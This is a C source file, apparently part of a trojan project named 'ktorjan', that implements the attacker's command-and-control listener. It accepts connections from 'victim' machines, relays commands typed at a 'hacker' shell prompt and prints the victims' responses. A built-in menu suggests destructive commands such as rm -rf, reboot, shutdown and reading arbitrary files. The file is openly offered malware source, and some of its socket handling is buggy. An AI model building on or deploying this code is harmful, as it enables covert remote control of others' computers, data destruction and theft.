// Copyright (c) 2026 Kloveme
// SPDX-License-Identifier: MIT
#include "../include/ktorjan.h"
#include <asm-generic/socket.h>
#include <bits/types/struct_timeval.h>
#include <netinet/in.h>
#include <stddef.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>


#define INT_NULL_TYPE -1;

extern void execute_commad (struct execute_data* commad_data);
extern int config_sock(struct sock_data* sock_d);
extern void print_command();

struct sock_data init_socket(const u_int64_t *server_port, char *server_host) {
    struct sock_data new_sock_d;
    memset(&new_sock_d, 0, sizeof(new_sock_d));
    socket_t _socket;
    new_sock_d.server_port = *server_port;
    new_sock_d.target_host = server_host;
    if(config_sock(&new_sock_d) == -1){
        socket_t return_code = -1;
        new_sock_d.new_socket = return_code;
    }
    return new_sock_d;
}

void start_server(struct sock_data *socket_data , struct execute_data *exec_d) { 
    u_int64_t target_port = socket_data->server_port;
    char* target_host = socket_data->target_host;
    socket_t server_sock = socket_data->new_socket;
    if (server_sock == -1)
    {
        printf("Error socket is NULL");
        return;
    }
    listen(server_sock, 5);
    printf("Your Trojan Running on %s:%lu\a\n" , target_host , target_port);
    while (1) {
        struct sockaddr_in new_victim_sock_addr;
        socklen_t victim_addr_len = sizeof(new_victim_sock_addr);
        socket_t victim_machine_sock = accept(socket_data->new_socket,
             (struct sockaddr*)&new_victim_sock_addr,&victim_addr_len);
            char* victim_machine_IP = inet_ntoa(new_victim_sock_addr.sin_addr);
            if (victim_machine_IP == NULL){
                close(victim_machine_sock); 
                printf("[FAILED] The connection is invalid\n"); 
                break;
            }
            printf("[LOG] New victim machine IP : \a%s\n" ,victim_machine_IP);
            char input_command_buffer[4096];
            char victim_response_buffer[449096];
            int victim_response_bytes;
            print_command();
            printf("\n");
            struct timeval tmv = {1 , 0};
            setsockopt(victim_machine_sock, SOL_SOCKET, 
                SO_RCVTIMEO, &tmv, sizeof(tmv));
            while (1) {
                printf("Shell command/hacker ~   ");
                fflush(stdout);
                char* fetch_command = fgets(input_command_buffer, 
                    sizeof(input_command_buffer), stdin);
                if (fetch_command == NULL) {
                    printf("[ERROR] Get command filed! is's possible EOF error !\n");
                    break;
                }
                input_command_buffer[strcspn(input_command_buffer, "\n")] = '\0';
                strcat(input_command_buffer, "\n");
                int command_len = strlen(input_command_buffer);
                if (send(victim_machine_sock, input_command_buffer, 
                    command_len, 0) <= 0)
                {
                    printf("[ERROR] Send command of vicime machine filed !\n");
                    break;
                }
                memset(victim_response_buffer, 0, sizeof(victim_response_buffer));
                victim_response_bytes = recv(victim_machine_sock, victim_response_buffer, sizeof(victim_response_buffer),
                 0);
                 if (victim_response_bytes == 0)
                 {
                    printf("[ERROR] Accept victim failed!\n");
                    continue;
                 }
                victim_response_buffer[victim_response_bytes] = '\0';
                printf("[LOGO]Accept %d bytes response\n" , victim_response_bytes);
                exec_d->commad_response = *victim_response_buffer;
                printf("Command result >> \n%s\n" , victim_response_buffer);
                if (victim_response_buffer <= 0) {break;}
                continue;
            }
    }
}

extern void print_command () {
    printf("[COMMAND] 1. ls -la | Linux \n");
    printf("[COMMAND] 2. rm -rf <File Name> | Linux \n");
    printf("[COMMAND] 3. cat  <File Path + File Name> | Linux \n");
    printf("[COMMAND] 4. reboot | Linux \n");
    printf("[COMMAND] 5. shutdown -h + <Time> | Linux\n");
    printf("[COMMAND] 6. <Binary FileName> | Linux\n");
}

int config_sock (struct sock_data* sock_d) {
    int listen_port = sock_d->server_port;
    char* listen_host = sock_d->target_host;
    socket_t new_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (new_sock <= -1) {return -1;}
    else {
        int reuse = 1;
        setsockopt(new_sock, 
            SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
        struct sockaddr_in sock_conf;
        sock_conf.sin_family = AF_INET;
        sock_conf.sin_port = htons(listen_port);
        sock_conf.sin_addr.s_addr = INADDR_ANY;
        if (bind(new_sock, (struct sockaddr*)&sock_conf, 
            sizeof(sock_conf)) <= 0) {
            sock_d->sock_addr = sock_conf;
            sock_d->new_socket = new_sock;
            return 0;
        }
        else {return -1;}
    }
}